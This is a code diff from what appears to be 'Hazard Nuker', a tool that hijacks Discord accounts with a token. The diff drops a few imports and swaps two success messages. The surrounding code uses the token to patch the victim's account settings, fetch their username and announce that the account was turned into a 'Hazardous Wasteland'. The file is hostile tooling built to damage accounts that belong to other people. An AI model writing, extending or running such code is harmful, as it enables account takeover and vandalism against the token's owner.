@@ -5,14 +5,11 @@ import threading
 import requests
 import json
 import Hazard
-import msvcrt
 import random
 
 from itertools import cycle
-from time import sleep
 from colorama import Fore
 
-import util.seizure
 from util.plugins.common import print_slow, setTitle, getheaders
 
 def Hazard_Nuke(token, Server_Name, message_Content):
@@ -94,8 +91,8 @@ def Hazard_Nuke(token, Server_Name, message_Content):
     requests.patch("https://discord.com/api/v9/users/@me/settings", headers=getheaders(token), json=setting)
     j = requests.get("https://discordapp.com/api/v9/users/@me", headers=getheaders(token)).json()
     a = j['username'] + "#" + j['discriminator']
-    setTitle(f"Succesfully turned {a} into a Hazardous Wasteland")
-    print_slow(f"{Fore.LIGHTGREEN_EX}Hazard Nuke Successfully Detonated! ")
+    setTitle(f"Hazard Nuke Successfully Detonated!")
+    print_slow(f"{Fore.LIGHTGREEN_EX}Succesfully turned {a} into a Hazardous Wasteland ")
     print("Enter anything to continue. . . ", end="")
     input()
     Hazard.main()
